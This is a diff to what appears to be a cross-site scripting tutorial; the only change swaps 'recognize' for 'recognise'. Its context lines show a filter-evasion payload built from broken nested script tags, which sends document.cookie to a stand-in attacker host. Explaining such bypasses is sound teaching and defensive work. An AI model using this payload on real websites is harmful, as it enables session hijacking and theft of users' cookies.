@@ -158,7 +158,7 @@ Filter Logic Errors: You can also exploit any errors in the filter logic. For ex
     location='http://attacker_server_ip/c='+document.cookie;
     </scrip</script>t>
 
-The filter won’t recognize those broken tags as legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:
+The filter won’t recognise those broken tags as legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:
 
     <script>location='http://attacker_server_ip/c='+document.cookie;</script>
 
